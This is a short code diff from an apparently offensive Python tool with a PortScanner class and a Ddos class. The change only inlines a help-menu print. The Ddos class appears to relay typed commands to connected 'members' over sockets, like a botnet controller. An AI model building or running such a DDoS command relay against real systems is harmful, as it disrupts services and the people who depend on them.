@@ -4,10 +4,6 @@ import socket
 import Menus
 
 
-def DisplayHelpMenu():
-    print(Menus.HelpMenu)
-
-
 class PortScanner:
     def __init__(self):
         pass
@@ -53,7 +49,7 @@ class Ddos:
             elif Input == "resume join\n":
                 self.Join = True
             elif Input == "-help\n":
-                DisplayHelpMenu()
+                print(Menus.HelpMenu)
             else:
                 for i in range(len(self.members)):
                     self.members[i].send(Input.encode())
